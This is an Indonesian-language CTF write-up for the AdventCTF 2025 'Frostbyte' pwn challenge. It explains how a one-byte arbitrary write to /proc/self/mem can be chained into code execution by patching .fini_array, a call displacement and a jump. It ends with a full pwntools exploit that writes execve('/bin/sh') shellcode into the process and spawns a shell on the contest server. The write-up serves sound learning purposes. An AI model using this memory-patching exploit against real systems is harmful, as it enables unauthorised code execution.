---
date: 2026-01-02 07:41:46
layout: post
title: "Understanding One-Byte Arbitrary Writes"
subtitle: pwning in adventctf 2025
description:
image: /assets/img/uploads/onebytewrite/kucing.jpg
optimized_image:
category:
tags:
author:
paginate: false
---

# Frostbyte (329 pts)
Dalam banyak tantangan binary exploitation(pwn), biasanya kita mencari bug besar: buffer overflow, heap corruption, atau overwrite pointer berukuran penuh.
Namun challenge ini menunjukkan hal yang sebaliknya, `satu byte` saja sudah cukup untuk mengambil alih kontrol program, jika ditulis di lokasi yang tepat.
## Description
>The Krampus Syndicate relies on small, deliberate changes to control systems without replacing them.
>This binary was used during an intrusion to apply a precise modification to an existing file. The rest of the system remains unchanged, but behavior can be redirected through that single edit.
>Find a way to use the modification capability to obtain the flag as a marker of your success.
>Access the endpoint @ nc ctf.csd.lol 8888

## Initial Analysis
kita di berikan sebuah file chall beserta libc nya seperti gambar di bawah ini, tapi aku sudah mem patch nya menggunakan `patchelf` agar libc nya sesuai
![Gambar 1]({{ site.baseurl }}/assets/img/uploads/onebytewrite/1.png)
dan juga ini hasil analisis basic security nya
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/2.png)
yang di mana `partial relro` yang memungkinkan kita mengubah apapun di dalam program nya

## Code Analysis
pas reverse fungsi `main` nya muncul seperti ini
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+Fh] [rbp-11h] BYREF
  int v5; // [rsp+10h] [rbp-10h] BYREF
  int fd; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  printf("Enter filename: ");
  fgets(filename_0, 256, stdin);
  filename_0[strcspn(filename_0, "\n")] = 0;
  printf("Enter offset: ");
  __isoc99_scanf("%d", &v5);
  getchar();
  printf("Enter data: ");
  read(0, &buf, 1uLL);
  fd = open(filename_0, 1);
  lseek(fd, v5, 0);
  write(fd, &buf, 1uLL);
  puts("Write complete.");
  return 0;
}
```
### Vulnerability Analysis
Program meminta filename, offset, dan 1 byte data. Ia kemudian melakukan:
```c
open(filename_0, 1);
lseek(fd, v5, 0);
write(fd, &buf, 1uLL);
```
Karena di Linux `Everything is a file`, kita bisa membuka `/proc/self/mem` File virtual ini merepresentasikan memori proses itu sendiri. Karena No PIE, kita tahu persis alamat memori yang ingin kita tulis.
cara verifikasi `/proc/self/mem` yaitu jalankan binary di terminal 1 nya lalu ketik seperti ini di terminal 2
```bash
└─$ ls -l /proc/$(pidof chall_patched)/mem

-rw------- 1 ilupii ilupii 0 Dec 29 02:07 /proc/23358/mem
```
maka di sana akan muncul `rw` atau read write yang menandakan kita bisa menulis dan membaca ke proses sendiri

### Batasan (Constraints)
* Program hanya melakukan 1 kali penulisan lalu exit.
* Kita perlu mengubah ini menjadi infinite loop untuk menyuntikkan shellcode byte-demi-byte.

## Exploitation Strategy
Jalan menuju shellcode dibagi menjadi 3 fase utama berdasarkan kendala yang ditemukan selama debugging. (aku melakukan ini selama 5 jam ahahaha, skill issue)
### Phase 1 : loop nya cuma 2 kali ???? pusing
ini ide aku ambil dari `chat gpt` dan setelah ku search memang ada tehniknya yaitu Ide awal nya adalah menimpa `.fini_array` (destructor yang dipanggil saat exit) agar kembali ke main. 
langkah pertama nya yaitu mendapatkan alamat `.fini_array` cara nya cukup mudah seperti ini
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/3.png)
setelah dapat alamat nya langsung coba di gdb untuk membuktikan nya
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/4.png)
bingo,,,, `0x0000000000401260` ini target yang akan kita eksekusi menggunakan 1 byte arbitrary write
jadi gambaran exploitasi nya seperti ini
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/5.png)
dan mari kita coba, dan akhirnya mengalami segfault seperti ini
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/6.png)
loop 1 itu berhasil dan loop kedua juga berhasil tapi loop ke 3 ?? `segfault`

#### Solusi ?
kita menggunakan `_start` untuk mendapatkan loop tak terbatas ketimbang memakai `.fini_array`
Kita tidak bisa mengandalkan `.fini_array` untuk loop selamanya. Kita harus memodifikasi instruksi di dalam main agar memanggil `_start` secara rekursif sebelum program sempat exit.
Di akhir fungsi main (0x4013d8), ada instruksi call puts (yang mencetak "Write complete"). Kita akan mem-patch instruksi ini agar bukannya memanggil `puts`, dia memanggil `_start`
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/7.png)
di gambar di atas di garis warna merah itu kita bisa melakukan patch untuk memanggil `_start` di karenakan main belum selesai maka dari itu kita bisa menciptakan loop program

oke di sini bagian krusial nya
Instruksi call pada x86-64 menggunakan format `call rel32`, di mana target pemanggilan ditentukan oleh displacement relatif terhadap RIP setelah instruksi. Pada alamat `0x4013d8`, RIP setelah instruksi adalah `0x4013dd`. Karena `puts@plt` berada di `0x4010f0`, displacement yang digunakan adalah `0x4010f0 - 0x4013dd = -0x2ed`, yang dalam representasi signed 32-bit adalah `0xfffffd13`. Setelah dikonversi ke little-endian, opcode lengkapnya menjadi `E8 13 FD FF FF`.
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/8.png)

selanjutnya Kita perlu mengubah displacement agar mengarah ke (0x4011b0) `_start`
Instruksi call menggunakan displacement relatif terhadap RIP setelah instruksi. Oleh karena itu, untuk mengalihkan pemanggilan dari puts@plt ke _start, kita harus menghitung ulang displacement seperti ini
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/9.png)
shingga opcode nya berubah dari `E8 13 FD FF FF` ke ----> `E8 D3 FD FF FF`
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/10.png)
bingooo sekarang kita dapat loop infinity

### Phase 2 : shellcode nya di simpan kemana ya ???
Kita perlu area untuk menaruh shellcode. Menginput "filename" berulang kali sangat lambat dan rentan error. Kita akan mem-patch kode program `(segment .text)` agar melompati fgets.

jadi ide nya itu seperti ini, gambar di bawah ini adalah flow normal dari program
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/12.png)
ini alur eksekusi nya
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/13.png)
melompati area tengah area kosong. Kita isi dengan `(shellcode)`. Lalu di akhir, kita ubah `JUMP`-nya agar mendarat tepat di tengah `shellcode` itu 

#### original
kita menggunakan bagian ini untuk membuat shellcode 
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/11.png)
pada gambar di atas itu artinya Memori masih bersih. Instruksi XOR EAX, EAX masih utuh
#### transisi
kita coba patch menjadi seperti ini
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/14.png)
Opcode 31 (XOR) digabung dengan 56 diterjemahkan CPU menjadi `xor [rsi+0x56], edx.`
#### final (JMP Active)
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/15.png)
Sebelum di-Patch: Area memori di sekitar `0x4012d2` berisi instruksi-instruksi untuk menyiapkan fgets (seperti lea, mov, call). Jika program mencoba mengeksekusi area ini saat kita sedang menimpanya dengan shellcode separuh jalan, program akan crash (SIGILL/SIGSEGV).

Setelah di-Patch (JMP): Program melompat dari `0x4012ce` langsung ke `0x401326`.
Efeknya: Area di antaranya (bekas fgets) menjadi "Tanah Tak Bertuan" atau Dead Code.
Keuntungan: Karena area itu sudah tidak dilewati/diexecute oleh CPU, kita bebas mengobrak-abrik isinya. Kita menimpa instruksi fgets yang sudah mati itu dengan byte-byte Shellcode kita.

dengan begitu kita bisa menulis solve script seperti ini
## Solve.py
```python
#!/usr/bin/env python3
from re import A
from this import s

from pwn import *

exe = context.binary = ELF(args.EXE or "./chall_patched")
context.terminal = ["wt.exe", "wsl.exe"]


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
continue
""".format(**locals())

HOST = "ctf.csd.lol"
PORT = 8888

p = start()


def coba(offset, data):
    p.sendlineafter(b"filename: ", b"/proc/self/mem")
    p.sendlineafter(b"offset: ", str(offset).encode())
    p.sendafter(b"data: ", data)


def shell(offset, data):
    p.sendlineafter(b"offset: ", str(offset).encode())
    p.sendafter(b"data: ", data)


ADDR_FINI_ARRAY = 0x403DF0
ADDR_MAIN_LSB = 0xB5
ADDR_PUTS_CALL = 0x4013D9
ADDR_XOR_EAX = 0x4012CE
ADDR_SHELLCODE = 0x4012D2

coba(ADDR_FINI_ARRAY, p8(ADDR_MAIN_LSB))
coba(ADDR_PUTS_CALL, b"\xd3")
coba(ADDR_XOR_EAX + 1, b"\x56")
coba(ADDR_XOR_EAX, b"\xeb")

# Shellcode: execve("/bin/sh", 0, 0)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x0f\x05"

for i, byte in enumerate(shellcode):
    target_addr = ADDR_SHELLCODE + i
    shell(target_addr, p8(byte))
    if i % 5 == 0:
        print(f"Injecting {i}/{len(shellcode)}...")

p.sendlineafter(b"offset: ", str(ADDR_XOR_EAX + 1).encode())
p.sendafter(b"data: ", b"\x02")

p.clean()
p.interactive()

```
![Gambar 2]({{ site.baseurl }}/assets/img/uploads/onebytewrite/16.png)
